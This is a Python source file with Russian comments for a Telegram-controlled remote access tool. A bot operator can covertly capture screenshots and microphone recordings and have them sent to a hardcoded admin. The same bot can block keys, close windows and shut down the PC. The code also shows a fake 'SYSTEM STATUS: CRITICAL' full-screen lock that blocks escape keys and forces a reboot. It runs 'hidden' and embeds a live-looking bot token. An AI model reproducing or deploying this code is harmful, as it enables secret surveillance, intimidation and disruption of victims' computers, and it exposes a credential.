import os
import asyncio
import mss
import tkinter as tk
from tkinter import messagebox
import keyboard
import webbrowser
import pyautogui
import sounddevice as sd
from scipy.io import wavfile
import ctypes
import sys

from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.session.aiohttp import AiohttpSession

# --- НАСТРОЙКИ ПУТЕЙ ---
# Использование sys.executable гарантирует правильные пути даже при запуске через планировщик
BASE_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
SCT_PATH = os.path.join(BASE_DIR, "sct.png")
REC_PATH = os.path.join(BASE_DIR, "rec.wav")

# --- НАСТРОЙКИ ---
API_TOKEN = '8463167776:AAFyRsId2qlOa7qv4yKXi0gvdfKC1bCc2jM'
ADMIN_ID = 790289059 
LOCK_PASSWORD = "1234"

session = AiohttpSession()
bot = Bot(token=API_TOKEN, session=session)
dp = Dispatcher()

keys_blocked = False
blocked_list = ['windows', 'alt', 'tab', 'esc', '1', '2', '3', 'w', 'a']

# --- ИСПРАВЛЕНИЯ ОШИБОК ---

def close_active_window():
    try:
        pyautogui.hotkey('alt', 'f4')
    except Exception as e:
        print(f"Ошибка pyautogui: {e}")

def toggle_keys():
    global keys_blocked
    if not keys_blocked:
        for key in blocked_list:
            try: 
                keyboard.block_key(key)
            except: 
                pass
        keys_blocked = True
        return "🚫 Клавиши ЗАБЛОКИРОВАНЫ"
    else:
        try:
            keyboard.unhook_all()
        except:
            pass
        keys_blocked = False
        return "✅ Клавиши РАЗБЛОКИРОВАНЫ"

def show_secure_lock():
    # Чтобы окно Tkinter не конфликтовало с asyncio, 
    # важно вызывать это через run_in_executor (что уже есть в handle_callbacks)
    try:
        pyautogui.press('volumemute')
        root = tk.Tk()
        root.attributes("-topmost", True, "-fullscreen", True)
        root.configure(bg='black')
        root.config(cursor="none")
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        for k in ['windows', 'alt', 'tab', 'esc', 'ctrl', 'delete']:
            try: keyboard.block_key(k)
            except: pass

        tk.Label(root, text="SYSTEM STATUS: CRITICAL", 
                 fg="red", bg="black", font=("Courier New", 14)).pack(pady=20)

        label_main = tk.Label(root, text="КОПИРОВАНИЕ ФАЙЛОВ СИСТЕМЫ...", 
                              fg="#00FF00", bg="black", font=("Courier New", 28, "bold"))
        label_main.pack(expand=True)

        label_timer = tk.Label(root, text="Инициализация перезагрузки через: 90 сек", 
                               fg="gray", bg="black", font=("Courier New", 18))
        label_timer.pack(pady=40)

        pwd_entry = tk.Entry(root, show="*", font=("Arial", 1), bg="black", fg="black", borderwidth=0, insertontime=0)
        pwd_entry.pack()
        pwd_entry.focus_force()

        remaining_time = 90

        def update_timer():
            nonlocal remaining_time
            if remaining_time > 0:
                remaining_time -= 1
                label_timer.config(text=f"Инициализация перезагрузки через: {remaining_time} сек")
                root.after(1000, update_timer)
            else:
                os.system("shutdown /r /t 0")

        def check_pwd(event=None):
            if pwd_entry.get() == LOCK_PASSWORD:
                keyboard.unhook_all()
                global keys_blocked
                keys_blocked = False
                pyautogui.press('volumemute')
                root.destroy()
            else:
                pwd_entry.delete(0, tk.END)

        pwd_entry.bind('<Return>', check_pwd)
        root.after(1000, update_timer)
        root.mainloop()
    except Exception as e:
        print(f"Ошибка Tkinter: {e}")

def get_keyboard():
    lock_text = "🔓 Заблокировать клавиши" if not keys_blocked else "🔒 Разблокировать клавиши"
    buttons = [
        [InlineKeyboardButton(text="📸 Скриншот", callback_data="screenshot")],
        [InlineKeyboardButton(text="❌ Закрыть активное окно", callback_data="close_window")],
        [InlineKeyboardButton(text=lock_text, callback_data="toggle_keys")],
        [InlineKeyboardButton(text="🎙 Запись (10с)", callback_data="record"),
         InlineKeyboardButton(text="🔇 Звук (Mute)", callback_data="mute")],
        [InlineKeyboardButton(text="🛡 ЗАПУСК КОПИРОВАНИЯ + РЕБУТ", callback_data="lock_now")],
        [InlineKeyboardButton(text="🔌 Выключить ПК", callback_data="shutdown")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.callback_query()
async def handle_callbacks(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID: 
        return
    
    data = callback.data
    try: 
        await callback.answer()
    except: 
        pass

    if data == "screenshot":
        try:
            with mss.mss() as sct:
                # ВАЖНО: принудительно делаем скриншот первого монитора
                sct.shot(mon=-1, output=SCT_PATH) 
            
            if os.path.exists(SCT_PATH):
                photo = types.FSInputFile(SCT_PATH)
                await bot.send_photo(ADMIN_ID, photo, caption="📸 Скриншот готов")
                os.remove(SCT_PATH)
            else:
                await bot.send_message(ADMIN_ID, "❌ Файл не создался. Проверьте права доступа.")
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"❌ Ошибка захвата экрана: {e}")

    elif data == "record":
        try:
            fs = 44100
            duration = 10
            rec = sd.rec(int(duration * fs), samplerate=fs, channels=1) # channels=1 стабильнее
            sd.wait()
            wavfile.write(REC_PATH, fs, rec)
            
            voice = types.FSInputFile(REC_PATH)
            await bot.send_voice(ADMIN_ID, voice)
            os.remove(REC_PATH)
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"❌ Ошибка микрофона: {e}")

    elif data == "close_window":
        close_active_window()
        await bot.send_message(ADMIN_ID, "❌ Активное окно закрыто.")

    elif data == "toggle_keys":
        status = toggle_keys()
        await callback.message.edit_reply_markup(reply_markup=get_keyboard())
        await bot.send_message(ADMIN_ID, status)

    elif data == "mute":
        pyautogui.press('volumemute')
        await bot.send_message(ADMIN_ID, "🔇 Режим звука изменен.")

    elif data == "lock_now":
        await bot.send_message(ADMIN_ID, "⚠️ Запуск блокировки экрана...")
        loop = asyncio.get_event_loop()
        loop.run_in_executor(None, show_secure_lock)

    elif data == "shutdown":
        await bot.send_message(ADMIN_ID, "🔌 ПК выключается...")
        os.system("shutdown /s /t 0")

async def main():
    # Удаляем старые вебхуки, чтобы polling работал стабильно
    await bot.delete_webhook(drop_pending_updates=True)
    try: 
        await bot.send_message(ADMIN_ID, "✅ Бот запущен и скрыт. Ожидаю команд.", reply_markup=get_keyboard())
    except Exception as e:
        print(f"Ошибка связи с TG: {e}")
    
    await dp.start_polling(bot)

if __name__ == '__main__':
    # Скрытие консоли, если запущен не через pythonw
    # ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    asyncio.run(main())